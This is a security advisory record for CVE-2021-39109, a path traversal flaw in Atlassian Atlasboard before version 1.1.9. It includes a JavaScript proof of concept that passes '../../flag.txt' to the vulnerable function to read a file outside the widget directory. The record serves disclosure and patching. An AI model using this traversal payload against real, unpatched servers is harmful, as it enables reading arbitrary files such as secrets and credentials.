advisory_id: GHSA-25pr-6pr6-68v7
datasource_id: github_osv_importer_v2/GHSA-25pr-6pr6-68v7
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/09/GHSA-25pr-6pr6-68v7/GHSA-25pr-6pr6-68v7.json
aliases:
  - CVE-2021-39109
summary: |
  Path traversal in atlasboard
  The renderWidgetResource resource in Atlasian Atlasboard before version 1.1.9 allows remote attackers to read arbitrary files via a path traversal vulnerability.

  ### PoC
  ```javascript
  const widget = require(\"atlasboard/lib/webapp/routes/widget\");

  // Mock req and res
  const req = {};
  const res = {
    sendFile: (filePath) => {
      // Read and return file contents synchronously
      const data = fs.readFileSync(filePath, \"utf8\");
      console.log(\"Contents of /flag.txt:\");
      console.log(data);
    },
    status: function (code) {
      this.statusCode = code;
      return this;
    },
    send: function (msg) {
      throw new Error(`Server responded with status ${this.statusCode}: ${msg}`);
    },
  };

  // localPackagesPath set to root to allow traversal to /flag.txt
  const localPackagesPath = \"/\";

  // resource string with path traversal to escape localPackagesPath and widgets directory
  const resource = \"../../flag.txt\";

  // Call vulnerable function
  await widget.renderWidgetResource(localPackagesPath, resource, req, res);
  ```
impacted_packages:
  - purl: pkg:npm/atlasboard
    affected_versions: vers:npm/<1.1.9
    fixed_versions: vers:npm/1.1.9
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/09/GHSA-25pr-6pr6-68v7/GHSA-25pr-6pr6-68v7.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-22
references:
  - url: https://arxiv.org/abs/2506.04962
    reference_type:
    reference_id:
  - url: https://arxiv.org/pdf/2506.04962
    reference_type:
    reference_id:
  - url: https://bitbucket.org/atlassian/atlasboard/commits/9c03df09f09399e2601010466e8ba3a28236eb9c
    reference_type:
    reference_id:
  - url: https://bitbucket.org/atlassian/atlasboard/pull-requests/91/buildeng-19379-apply-only-the-path
    reference_type:
    reference_id:
  - url: https://bitbucket.org/atlassian/atlasboard/src/master
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2021-39109
    reference_type:
    reference_id: CVE-2021-39109
